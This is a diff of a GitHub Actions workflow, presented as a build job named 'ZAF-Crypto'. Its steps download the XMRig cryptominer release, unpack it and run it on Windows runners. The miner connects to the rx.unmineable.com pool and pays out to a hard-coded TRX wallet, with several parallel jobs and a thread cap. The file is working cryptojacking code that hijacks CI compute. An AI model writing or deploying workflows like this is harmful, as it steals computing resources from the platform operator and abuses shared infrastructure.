@@ -1,10 +1,10 @@
-name: eX-code_UMBL
+name: ZAF-Crypto
  
 on: [workflow_dispatch]
  
 jobs:
   build:
-    name: eX-code_UMBL
+    name: ZAF-Crypto
     runs-on: windows-latest
     strategy:
       max-parallel: 5
@@ -17,10 +17,10 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: PREPARING
-      run: Invoke-WebRequest https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-win64.zip -Outfile XLArig-v5.2.2-win64.zip
+      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-msvc-win64.zip -Outfile xmrig-6.17.0-msvc-win64.zip
     - name: Seting-UP
-      run: Expand-Archive XLArig-v5.2.2-win64.zip
+      run: Expand-Archive xmrig-6.17.0-msvc-win64.zip
     - name: Running
-      run: .\XLArig-v5.2.2-win64\xlarig.exe --no-huge-pages -o rx.unmineable.com:3333 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u TRX:TJzKgLEC7Mjt2XuUNZ4SwBaGHT9S5Cu9Qa.AMSON1
+      run: .\xmrig-6.17.0-msvc-win64\xmrig-6.17.0\xmrig.exe --no-huge-pages -o rx.unmineable.com:3333 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u TRX:TJzKgLEC7Mjt2XuUNZ4SwBaGHT9S5Cu9Qa.AMSON1
     - name: DONE
       run: exit
